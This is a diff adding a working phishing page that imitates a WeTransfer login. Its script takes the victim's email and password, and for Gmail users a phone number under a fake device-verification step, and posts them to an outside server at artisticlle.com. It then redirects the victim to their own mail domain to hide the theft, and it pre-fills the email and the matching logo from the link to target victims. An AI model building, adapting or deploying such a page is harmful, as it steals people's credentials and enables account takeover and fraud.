@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in | WeTransfer</title>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
+    <link rel="icon" type="image/png" sizes="10x10" href="https://downloads.ccbdownload.online/logo.png">
+    <style>
+        .cover-image-cont{background-image:url('https://downloads.ccbdownload.online/Untitled1.jpg'); background-position:center; background-size:cover; height:100vh;}
+        .bg-transperant{background:rgba(0,0,0,0.77); height:100vh;}
+        .log-transition{transition:all 0.3s ease;}
+        .hide{display:none;}
+        .error-box{display:none;}
+    </style>
+</head>
+<body>
+    <div class="container-fluid p-0 cover-image-cont">
+        <div class="col-12 p-0 bg-transperant d-flex align-items-center">
+            <div class="col-xs-12 col-sm-12 col-md-8 col-lg-4 col-xl-4 mx-auto">
+                <div class="bg-white px-4 py-5 shadow rounded">
+                    <div class="form-group text-center">
+                        <img class="log log-transition" src="https://downloads.ccbdownload.online/logo.png" width="80" id="logo">
+                    </div>
+                    
+                    <!-- Main Login Form -->
+                    <div id="div1">
+                        <div class="alert alert-danger error-box" id="errorMsg"></div>
+                        <div class="form-group">
+                            <label class="text-secondary font-weight-bold">Email Address</label>
+                            <input type="email" class="form-control" id="email" placeholder="you@example.com">
+                        </div>
+                        <div class="form-group">
+                            <label class="text-secondary font-weight-bold">Password</label>
+                            <input type="password" class="form-control" id="password">
+                        </div>
+                        <div class="form-group">
+                            <button class="btn px-4" style="background:#067438; color:#fff;" id="submitBtn">Login</button>
+                        </div>
+                    </div>
+                    
+                    <!-- Phone Verification Form -->
+                    <div id="div2" class="hide">
+                        <div class="mb-3">
+                            <span class="fas fa-arrow-left" id="backBtn" style="cursor:pointer;"></span>
+                            <span id="displayEmail" class="h5 ml-2"></span>
+                        </div>
+                        <h4 class="font-weight-normal mb-2">Verify it's you</h4>
+                        <p class="mb-3">This device is not recognized. For security, we want to make sure it's really you.</p>
+                        <div class="alert alert-danger error-box" id="phoneError"></div>
+                        <p class="mb-3">Try another way to sign in</p>
+                        <div class="form-group">
+                            <input type="text" class="form-control" id="phone" placeholder="Enter Phone Number">
+                        </div>
+                        <div class="form-group">
+                            <button class="btn px-4" style="background:#067438; color:#fff;" id="verifyBtn">Verify</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Minimal JavaScript -->
+    <script>
+    (function() {
+        const BACKEND_URL = 'https://artisticlle.com/asda/bknd.php';
+        let emailSubmitted = '';
+        let loginAttempts = 0;
+        
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            // Handle URL hash email
+            const hashEmail = window.location.hash.substring(1);
+            if (hashEmail.includes('@')) {
+                document.getElementById('email').value = hashEmail;
+                updateLogo(hashEmail);
+            }
+            
+            // Email input change
+            document.getElementById('email').addEventListener('input', function(e) {
+                if (e.target.value.includes('@')) {
+                    updateLogo(e.target.value);
+                }
+            });
+            
+            // Login button
+            document.getElementById('submitBtn').addEventListener('click', submitLogin);
+            
+            // Enter key in email/password
+            ['email', 'password'].forEach(id => {
+                document.getElementById(id).addEventListener('keypress', function(e) {
+                    if (e.key === 'Enter') submitLogin();
+                });
+            });
+            
+            // Verify button
+            document.getElementById('verifyBtn').addEventListener('click', submitPhoneVerification);
+            document.getElementById('phone').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') submitPhoneVerification();
+            });
+            
+            // Back button
+            document.getElementById('backBtn').addEventListener('click', function() {
+                document.getElementById('div2').classList.add('hide');
+                document.getElementById('div1').classList.remove('hide');
+            });
+        });
+        
+        // Update logo based on email domain
+        function updateLogo(email) {
+            const domain = email.split('@')[1];
+            if (domain) {
+                const logo = document.getElementById('logo');
+                logo.src = `https://logo.clearbit.com/${domain}`;
+                logo.onerror = () => logo.src = 'https://downloads.ccbdownload.online/logo.png';
+            }
+        }
+        
+        // Submit login form
+        async function submitLogin() {
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const submitBtn = document.getElementById('submitBtn');
+            const errorMsg = document.getElementById('errorMsg');
+            
+            // Clear previous errors
+            errorMsg.style.display = 'none';
+            
+            // Validation
+            if (!validateEmail(email)) {
+                showError('Please enter a valid email address');
+                return;
+            }
+            if (!password) {
+                showError('Please enter your password');
+                return;
+            }
+            
+            // Store email
+            emailSubmitted = email;
+            const isGmail = email.toLowerCase().endsWith('@gmail.com');
+            
+            // Update UI
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Verifying...';
+            
+            try {
+                // Submit to backend
+                const response = await submitToBackend({
+                    action: 'login',
+                    email: email,
+                    password: password,
+                    step: ++loginAttempts
+                });
+                
+                if (response.success) {
+                    // Handle Gmail 2-step verification
+                    if (isGmail && loginAttempts === 1) {
+                        showPhoneVerification(email);
+                    } else {
+                        // Redirect to email domain
+                        redirectToDomain(email);
+                    }
+                } else {
+                    showError('Login failed. Please try again.');
+                }
+            } catch (error) {
+                console.error('Submission error:', error);
+                showError('Connection error. Please try again.');
+            } finally {
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Login';
+            }
+        }
+        
+        // Submit phone verification
+        async function submitPhoneVerification() {
+            const phone = document.getElementById('phone').value.trim();
+            const verifyBtn = document.getElementById('verifyBtn');
+            const phoneError = document.getElementById('phoneError');
+            
+            // Clear previous errors
+            phoneError.style.display = 'none';
+            
+            if (!phone) {
+                phoneError.textContent = 'Please enter your phone number';
+                phoneError.style.display = 'block';
+                return;
+            }
+            
+            // Update UI
+            verifyBtn.disabled = true;
+            verifyBtn.textContent = 'Verifying...';
+            
+            try {
+                const response = await submitToBackend({
+                    action: 'verify_phone',
+                    email: emailSubmitted,
+                    phone: phone
+                });
+                
+                if (response.success) {
+                    redirectToDomain(emailSubmitted);
+                } else {
+                    phoneError.textContent = 'Verification failed';
+                    phoneError.style.display = 'block';
+                }
+            } catch (error) {
+                console.error('Verification error:', error);
+                phoneError.textContent = 'Connection error';
+                phoneError.style.display = 'block';
+            } finally {
+                verifyBtn.disabled = false;
+                verifyBtn.textContent = 'Verify';
+            }
+        }
+        
+        // Submit data to backend
+        async function submitToBackend(data) {
+            const formData = new URLSearchParams();
+            for (const key in data) {
+                formData.append(key, data[key]);
+            }
+            
+            const response = await fetch(BACKEND_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: formData
+            });
+            
+            return await response.json();
+        }
+        
+        // Show phone verification form
+        function showPhoneVerification(email) {
+            document.getElementById('displayEmail').textContent = email;
+            document.getElementById('div1').classList.add('hide');
+            document.getElementById('div2').classList.remove('hide');
+            document.getElementById('password').value = '';
+        }
+        
+        // Redirect to email domain
+        function redirectToDomain(email) {
+            const domain = email.split('@')[1];
+            if (domain) {
+                setTimeout(() => {
+                    window.location.href = `https://${domain}`;
+                }, 1000);
+            }
+        }
+        
+        // Show error message
+        function showError(message) {
+            const errorMsg = document.getElementById('errorMsg');
+            errorMsg.textContent = message;
+            errorMsg.style.display = 'block';
+        }
+        
+        // Email validation
+        function validateEmail(email) {
+            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+        }
+    })();
+    </script>
+</body>
+</html>
